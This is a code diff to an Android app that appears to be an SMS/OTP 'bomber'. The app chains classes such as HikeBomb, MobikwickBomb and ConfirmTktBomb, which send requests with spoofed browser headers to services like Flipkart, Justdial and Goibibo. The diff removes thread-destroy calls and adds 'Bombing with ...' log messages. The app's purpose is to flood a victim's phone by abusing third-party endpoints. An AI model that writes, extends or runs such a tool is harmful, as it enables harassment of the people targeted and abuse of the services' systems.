@@ -249,7 +249,6 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
-            mThread.destroy();
             new HikeBomb().execute();
         }
     }
@@ -301,7 +300,6 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
-            mThread.destroy();
             new MobikwickBomb().execute();
 
         }
@@ -358,7 +356,6 @@ public class HomeActivity extends AppCompatActivity {
         @Override
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
-            mThread.destroy();
             new ConfirmTktBomb().execute();
 
         }
@@ -436,6 +433,13 @@ public class HomeActivity extends AppCompatActivity {
                             .addHeader("origin", "https://www.flipkart.com")
                             .addHeader("content-length", "53").addHeader("connection", "keep-alive").build());
 
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            addLog("00AA00", "Bombing with Flipkart");
+                        }
+                    });
+
                 }
             });
             mThread.start();
@@ -470,6 +474,14 @@ public class HomeActivity extends AppCompatActivity {
                     new OkHttpClient().newCall(new Request.Builder().url(str)
                             .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
                             .build());
+
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            addLog("00AA00", "Bombing with Justdiel");
+
+                        }
+                    });
 
                 }
             });
@@ -514,7 +526,13 @@ public class HomeActivity extends AppCompatActivity {
                             .addHeader("connection", "keep-alive")
                             .addHeader("upgrade-insecure-requests", "1").build());
 
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            addLog("00AA00", "Bombing with Goibibo");
 
+                        }
+                    });
                 }
             });
             mThread.start();
